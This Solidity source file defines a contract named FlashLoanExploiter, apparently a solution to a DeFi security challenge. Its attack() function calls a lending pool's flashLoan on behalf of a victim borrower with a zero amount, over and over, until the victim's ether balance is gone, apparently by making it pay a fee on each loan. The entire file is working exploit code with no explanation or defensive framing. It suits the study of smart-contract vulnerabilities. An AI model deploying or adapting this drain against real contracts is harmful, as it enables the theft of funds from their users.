// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.17;
import {Address} from "openzeppelin-contracts/utils/Address.sol";

interface IPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract FlashLoanExploiter {
    IPool private _pool;
    address private _naiveBorower;
    address private _attacker;

    constructor(address payable poolAddress, address naiveBorrowerAddress) {
        _pool = IPool(poolAddress);
        _naiveBorower = naiveBorrowerAddress;
        _attacker = msg.sender;
    }

    function attack() public {
        while (_naiveBorower.balance > 0) {
            _pool.flashLoan(_naiveBorower, 0);
        }
    }
}
